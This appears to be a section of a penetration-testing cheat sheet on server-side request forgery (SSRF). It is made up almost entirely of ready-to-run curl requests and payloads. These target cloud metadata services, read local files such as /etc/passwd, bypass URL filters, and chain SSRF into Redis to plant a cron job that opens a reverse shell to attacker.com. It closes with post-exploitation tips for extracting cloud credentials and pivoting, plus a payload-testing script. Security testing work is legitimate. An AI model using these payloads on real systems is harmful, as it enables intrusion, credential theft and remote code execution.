### 3.4 Server-Side Vulnerabilities
#### 3.4.1 SSRF Testing
    #### 1. BASIC MANUAL TESTING
    # HTTP/S schemes
    curl -v "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
    curl -v "https://target.com/export?pdf=http://attacker.com/ssrf"

    # Non-standard protocols (may work in some libraries)
    curl -v "https://target.com/parse?file=dict://attacker.com:1337/test"
    curl -v "https://target.com/download?q=file:///etc/passwd"

    # IPv6/IPv4 bypasses
    curl -v "https://target.com/api?server=http://[::1]:80/admin"
    curl -v "https://target.com/callback?url=http://0177.0.0.1/"

    #### 2. AUTOMATED TOOLS
    # SSRFmap (comprehensive testing)
    python3 ssrfmap.py -r request.txt -p url -m portscan --lhost=attacker.com

    # Gopherus (for SSRF->RCE)
    gopherus --exploit mysql
    # Then use generated payload with curl:
    curl -v "https://target.com/proxy?url=gopher://attacker.com:1337/_[PAYLOAD]"

    # Ffuf for internal service discovery
    ffuf -u "https://target.com/load?url=http://FUZZ.internal" -w wordlists/internal_services.txt

    #### 3. CLOUD METADATA TARGETS
    # AWS
    http://169.254.169.254/latest/meta-data/
    http://169.254.169.254/latest/user-data/

    # Google Cloud
    http://metadata.google.internal/computeMetadata/v1beta1/
    curl "http://target.com/api?cloud=http://metadata.google.internal" -H "Metadata-Flavor: Google"

    # Azure
    http://169.254.169.254/metadata/instance?api-version=2021-02-01
    curl "http://target.com/azure?url=http://169.254.169.254" -H "Metadata: true"

    #### 4. ADVANCED BYPASS TECHNIQUES
    # URL encoding
    http://target.com/redirect?url=http:%252f%252f127.0.0.1

    # DNS rebinding
    http://target.com/fetch?url=http://attacker.com/ (DNS TTL=0)

    # Whitelist bypass
    http://target.com@127.0.0.1
    http://127.0.0.1#target.com

    # SSRF via file upload
    convert -size 100x100 xc:red 'http://169.254.169.254/latest/meta-data/' out.png

    #### 5. BLIND SSRF DETECTION
    # Out-of-band detection (Burp Collaborator/OAST)
    curl "https://target.com/webhook?url=http://xyz.burpcollaborator.net"

    # Time-based detection
    time curl "https://target.com/fetch?url=http://169.254.169.254" > /dev/null

    # DNS-based detection
    curl "https://target.com/load?url=http://uniqueid.attacker.com"

    #### 6. CHAINING TECHNIQUES
    # SSRF to RCE via Redis
    curl "http://target.com/proxy?url=gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit"

    # SSRF to XSS
    http://target.com/render?template=http://attacker.com/xss.html

    #### 7. DEFENSE EVASION
    # IP rotation
    http://127.0.0.1.xip.io
    http://0x7f000001 (Hex IP)

    # Cloud metadata API bypass
    http://2a00:1450:4001:811::200e/metadata/ (Google IPv6)

    #### PRO TIPS:
    # 1. Always test:
    #  - All URL parameters
    #  - File uploads/imports
    #  - Webhook configurations
    #  - PDF generators
    #  - API integrations

    # 2. Critical endpoints:
    #  - Internal admin interfaces
    #  - Cloud metadata services
    #  - Database REST APIs (like Elasticsearch)
    #  - Redis/Memcached instances

    # 3. Post-exploitation:
    #  - Enumerate IAM roles (AWS)
    #  - Extract cloud credentials
    #  - Access Kubernetes API
    #  - Pivot to internal networks

    #### RECOMMENDED WORDLISTS:
    #  - /usr/share/seclists/Discovery/Web-Content/urls-of-interest-metadata.txt
    #  - /usr/share/seclists/Discovery/Web-Content/internal-services.txt
    #  - Custom lists for target's cloud provider

    #### SAMPLE DETECTION SCRIPT:
    ```
        bash
        #!/bin/bash
        # ssrf_tester.sh
        TARGET=$1
        INTERNAL_IP=$2

        PAYLOADS=(
        "http://$INTERNAL_IP"
        "file:///etc/passwd"
        "gopher://$INTERNAL_IP:6379/_"
        "dict://$INTERNAL_IP:22/info"
        )

        for payload in "${PAYLOADS[@]}"; do
        echo -n "Testing $payload: "
        curl -s "$TARGET?url=$payload" | grep -q "root:" && echo "VULNERABLE" || echo "filtered"
        done
    ```
    
